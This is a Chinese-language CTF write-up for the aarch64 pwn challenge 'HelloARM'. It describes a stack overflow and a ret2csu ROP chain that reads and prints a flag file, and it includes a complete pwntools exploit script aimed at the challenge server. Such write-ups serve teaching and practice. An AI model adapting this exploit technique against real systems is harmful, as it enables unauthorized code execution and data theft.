## HelloARM

这题是一道arm的pwn题，思路是ROP，给的程序包含三个文件：

```
Archive:  HelloARM-d16411d0de1ce65a122d8f567ff53897.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-10-05 17:31   lib/
  1345176  2020-10-05 17:30   lib/libc-2.27.so
   125896  2020-10-05 17:31   lib/ld-linux-aarch64.so.1
     9760  2020-10-04 22:14   HelloARM
---------                     -------
  1480832                     4 files
```

首先checksec看一下：

![image-20201019142904415](image-20201019142904415.png)

是aarch64小端的程序，可以发现开启了NX，意味着我们不能在栈上执行代码，没开PIE意味着地址不是随机的。

先用qemu跑一下程序：

```
qemu-aarch64 -L ./ ./HelloARM
```

![image-20201019132755929](image-20201019132755929.png)

总的来说程序先给出一个Magic number，然后会有两轮输入输出的交互。

接下来用ida分析，main函数先去执行init函数，其中会打开当前目录下的一个`./flag`文件，并把文件描述符存到全局变量`fd`里面，main函数内部在栈上开辟了一个缓冲区，Magic number就是这个缓冲区的栈地址，随后会读入大小为0x10的内容到bss段的`name`数组中，随后打印这串内容，最后进入`oooooo()`函数，函数内部开辟了0x100大小的栈上数组用来存用户输入的message，但这里存在溢出漏洞。

首先我们需要知道的是，aarch64用X30这个寄存器来存储函数调用的返回地址，并在进入子函数后将X30中的返回地址压入栈中。比较特别的是`oooooo()`函数中，栈上数组的地址比存放X30内容的地址高，因此无法劫持`oooooo()`的`ret`指令，但是我们还可以劫持`main()`的`ret`指令。

找到切入点后，我们尝试寻找可用的`gadget`，寻找一番没有找到合适的。但是该程序中包含一个`__libc_csu_init()`函数，利用该函数中的特殊结构，我们可以指定参数并完成任意函数的调用。

![image-20201019134343835](image-20201019134343835.png)

最后这题的思路主要是：

- 用`oooooo()`的缓冲区溢出劫持`main()`的`ret`指令，让它跳转到`__libc_csu_init()`函数内部`.text:0000000000400AD0`地址处（上图）。
- 然后我们通过精心构造溢出部分的内容，让程序去调用.plt表中的`read()`函数，读出`./flag`文件的内容（这里我们猜测服务器上fd的值是3，本地测试qemu上运行时fd是5），放到`main()`函数栈上的缓冲区中（即magic number给出的地址）。
- 然后再一次利用`__libc_csu_init()`函数，调用一个`write()`函数，将magic number处的内容写到标准输入里。


```python
from pwn import *
import sys
context.log_level='debug'
context.arch='aarch64'
Debug = True

elf=ELF('./HelloARM', checksec = False)

libc=ELF("./lib/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    return remote('10.104.255.210', 7777)
    # global libc
    # if args['REMOTE']:
    #     if other_libc is not null:
    #         libc = ELF("./", checksec = False)
    #     return remote('10.104.255.210', 7777)
    # elif Debug:
    #     sh = process(["qemu-aarch64", "-g", "2333", "-L", "./", "./HelloARM"])
    #     log.info('Please use GDB remote!(Enter to continue)')
    #     raw_input()
    #     return sh
    # else :
    #     return process(["qemu-aarch64", "-L", "./", "./HelloARM"])


conn = get_sh()
conn.recvline()
bb = conn.recvline()
hex_magic = bb[15:-1].decode('utf-8')
addr_magic = int(hex_magic, 16)

guess_fd = 3
flag_len = 0x20*8 - 8

conn.recv()
conn.send('imlk____________')
conn.recv()
payload = ('a' * 0x100).encode() # 填充

payload += p64(addr_magic - 0x10) # x29
payload += p64(0x0000000000400AD0) # x30 for ret to __libc
for i in range(0, 0x32):
    if i == 0x0: 
        payload += p64(0x0000000000400730) # set to write func pointer
    elif i == 0x1: # addr_magic-0x08 for w
        payload += p64(0x0000000000400760) # set to read func pointer
    elif i == 0x2: # addr_magic
        payload += p64(0) # addr_magic-0x28 for x19


    elif i == 0x22:# x29
        payload += p64(addr_magic - 0x10)
    elif i == 0x23:# x30
        payload += p64(0x0000000000400AB0) # for ret to __libc stage 2
    elif i == 0x25: # x20
        payload += p64(1) # to compare with x19, mark read() finished
    elif i == 0x26: # x21
        payload += p64(addr_magic - 0x8)
    elif i == 0x27: # x22
        payload += p64(guess_fd)
    elif i == 0x28: # x23
        payload += p64(addr_magic + 0x8)
    elif i == 0x29: # x24
        payload += p64(flag_len)


    elif i == 0x2a: # x29
        payload += p64(addr_magic - 0x10)
    elif i == 0x2b: # x30
        payload += p64(0x0000000000400AB0) # for ret to __libc stage 2
    elif i == 0x2d: # x20
        payload += p64(1) # to compare with x19, mark write() finished
    elif i == 0x2e: # x21
        payload += p64(addr_magic - 0x10)
    elif i == 0x2f: # x22
        payload += p64(1)
    elif i == 0x30: # x23
        payload += p64(addr_magic + 0x8)
    elif i == 0x31: # x24
        payload += p64(flag_len)
    else:
        payload += p64(i)

conn.send(payload)

while True:
    conn.recv()

```

看到flag了：

![image-20201019135329078](image-20201019135329078.png)

需要注意的是初始化时用`alarm()`函数，设定了一个定时器，会在1分钟内结束程序，在gdb调试过程中回很难受。可以用ida给程序打patch，把对`alarm()`的调用换成`nop`


## 